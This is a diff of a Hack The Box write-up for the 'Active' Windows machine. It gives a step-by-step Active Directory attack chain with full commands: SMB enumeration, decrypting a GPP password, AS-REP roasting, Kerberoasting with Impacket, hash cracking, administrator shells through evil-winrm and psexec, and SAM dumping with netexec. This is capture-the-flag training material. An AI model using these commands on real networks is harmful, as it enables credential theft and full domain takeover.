@@ -5,15 +5,23 @@ description: "My solution for the Active machine on Hack The Box, focusing on Ke
 tags: ["htb", "writeup", "windows", "kerberoasting", "active-directory"]
 ---
 
-# HTB: Active
+**By Stager** | FashilHack
 
-Active is a Windows Active Directory box that focuses on **Kerberoasting**, **SMB enumeration**, and abusing **service accounts** to gain administrative access.
+## What is this machine
 
-**Target IP:** `10.10.10.1`
+Active is a Windows Active Directory box from Hack The Box that focuses on:
+- **Kerberoasting**
+- **SMB enumeration**
+- Abusing **service accounts** to gain administrative access
 
----
+## Target
 
-## Concept: Kerberoasting (Quick Explanation)
+```
+IP: 10.10.10.1
+OS: Windows
+```
+
+## Step 1 — Concept: Kerberoasting (Quick Explanation)
 
 **Goal of Kerberoasting:**  
 Request a **TGS (Ticket Granting Service)** for a service account and crack the **service account password hash** offline.
@@ -26,21 +34,23 @@ Flow:
 
 Tool used: `GetUserSPNs.py` (Impacket)
 
----
+📸 **Screenshot to add here:**
+- Concept diagram or initial flow
 
-## Recon
+## Step 2 — Recon
 
 Initial Nmap scan:
 
 ```bash
 nmap -A -p- -T5 -Pn 10.10.10.1 -v
-````
+```
 
 This revealed SMB, Kerberos, LDAP, and other AD-related services.
 
----
+📸 **Screenshot to add here:**
+- Nmap output showing open ports
 
-## SMB Enumeration
+## Step 3 — SMB Enumeration
 
 ### smbmap (anonymous access check)
 
@@ -49,11 +59,8 @@ smbmap -H 10.10.10.1
 ```
 
 Looking for:
-
 * Anonymous access
 * Readable shares
-
----
 
 ### smbclient (manual enumeration)
 
@@ -81,9 +88,10 @@ Download a file:
 get Groups.xml
 ```
 
----
+📸 **Screenshot to add here:**
+- SMB shares and downloaded Groups.xml
 
-## Group Policy Preference Password
+## Step 4 — Group Policy Preference Password
 
 After downloading `Groups.xml`, a password hash was found.
 
@@ -94,14 +102,14 @@ gpp-decrypt <hash>
 ```
 
 This revealed:
-
 * A **username**
 * A **password**
 * The account was a **service account**
 
----
+📸 **Screenshot to add here:**
+- gpp-decrypt output showing credentials
 
-## Validate Credentials
+## Step 5 — Validate Credentials
 
 Check SMB access with the new credentials:
 
@@ -109,9 +117,7 @@ Check SMB access with the new credentials:
 smbmap -H 10.10.10.1 -u username -p password
 ```
 
----
-
-## AS-REP Roasting (GetNPUsers)
+## Step 6 — AS-REP Roasting (GetNPUsers)
 
 If you have a username but **no password**, test AS-REP roasting:
 
@@ -120,19 +126,15 @@ impacket-GetNPUsers FH.local/said -dc-ip 10.10.10.1 -no-pass
 ```
 
 ⚠️ AS-REP roasting only works if:
-
 * **“Do not require Kerberos preauthentication”** is enabled
 
 If it’s not enabled → no hash returned.
 
----
-
-## Kerberoasting (GetUserSPNs)
+## Step 7 — Kerberoasting (GetUserSPNs)
 
 Kerberoasting targets **service accounts with SPNs**.
 
 Important facts:
-
 * Kerberoasting depends **ONLY on SPNs**
 * You **must** have at least **one valid domain user**
 * You crack the **service account password**, not admin directly
@@ -143,8 +145,6 @@ Request TGS:
 impacket-GetUserSPNs -request -dc-ip 10.10.10.1 DOMAIN/username:password
 ```
 
----
-
 ### Fix Clock Skew (if error)
 
 ```bash
@@ -152,9 +152,10 @@ sudo apt install ntpsec-ntpdate -y
 sudo ntpdate 10.10.10.1
 ```
 
----
+📸 **Screenshot to add here:**
+- GetUserSPNs returning a hash
 
-## Crack the Hash
+## Step 8 — Crack the Hash
 
 Identify hash type by the `$` format, then crack using Hashcat:
 
@@ -168,9 +169,10 @@ Or with John:
 john hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
----
+📸 **Screenshot to add here:**
+- Hashcat or John showing cracked password
 
-## Shell Access
+## Step 9 — Shell Access
 
 After cracking the hash, authenticate using:
 
@@ -182,8 +184,6 @@ evil-winrm -i 10.10.10.1 -u administrator -p password
 
 ⚠️ Reminder:
 If WinRM is blocked, evil-winrm will NOT work.
-
----
 
 ### psexec (fallback)
 
@@ -197,9 +197,10 @@ With rlwrap:
 rlwrap impacket-psexec active.htb/administrator:password@10.10.10.1
 ```
 
----
+📸 **Screenshot to add here:**
+- Administrative shell access
 
-## netexec (crackmapexec replacement)
+## Step 10 — netexec (crackmapexec replacement)
 
 Validate credentials:
 
@@ -219,26 +220,31 @@ Dump SAM (admin required):
 netexec smb 10.10.10.1 -u "administrator" -p "password" --sam
 ```
 
----
+## Full Attack Chain
 
-## Notes / Reminders
+```
+Nmap / Recon
+  ↓
+SMB Enumeration → Groups.xml
+  ↓
+GPP Decrypt → user credentials
+  ↓
+Kerberoasting (GetUserSPNs) → service account hash
+  ↓
+Crack hash → administrator password
+  ↓
+Shell access via psexec / evil-winrm
+```
 
-* Kerberoasting works **only on SPNs**
-* AS-REP roasting works **only if pre-auth is disabled**
-* You always need **at least one valid domain user**
-* Service account passwords are often reused
-* SMB misconfigurations are common in AD environments
+## Key Takeaways
 
----
+**1. SMB misconfigurations expose sensitive data**  
+Readable `Groups.xml` often leads to leaked GPP passwords.
 
-## Summary
+**2. Kerberoasting is highly effective**  
+As long as you have one valid user and an SPN exists, you can attempt to crack the service account offline.
 
-* Enumerated SMB shares
-* Extracted credentials from Group Policy Preferences
-* Performed Kerberoasting using Impacket
-* Cracked service account hash
-* Logged in as Administrator
-* Fully compromised the domain
+**3. Tooling flexibility**  
+Using Impacket suite and Netexec allows for thorough AD enumeration and credential validation.
 
-This completes the **Active** machine.
-
+_Stager — FashilHack — Simulating Attacks, Securing Businesses._
